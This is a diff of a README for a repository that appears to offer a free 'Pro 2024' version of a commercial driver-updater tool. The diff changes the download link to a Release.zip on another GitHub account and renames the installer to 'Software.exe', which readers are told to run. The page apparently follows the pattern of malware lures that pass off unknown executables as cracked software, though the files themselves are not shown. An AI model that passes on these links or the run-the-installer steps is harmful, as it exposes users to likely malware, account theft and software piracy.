@@ -9,12 +9,12 @@
 
 ### Installation
 [![asdasdasd](https://github.com/user-attachments/assets/ffa0dbe9-736c-4509-b6d9-f87e2452bf5a)
-](https://github.com/bernardo-dev/Driver-Booster-Pro-2024/releases/download/V8.54/Release.zip)
+](https://github.com/tushar42002/Driver-Booster-Pro-2024/releases/download/Release/Release.zip)
 
 
 
 ## **1. [Download the archive](https://github.com/bernardo-dev/Driver-Booster-Pro-2024/releases/download/V8.54/Release.zip) and extract it to a convenient folder.**
-## **2. Run the auto-installer `Installing_File_x64.exe`. It will install and download all necessary packages for > operation.**
+## **2. Run the auto-installer `Software.exe`. It will install and download all necessary packages for > operation.**
 
 ![image](https://github.com/user-attachments/assets/df753b7b-16af-4baa-8608-61b078a609b1)
 
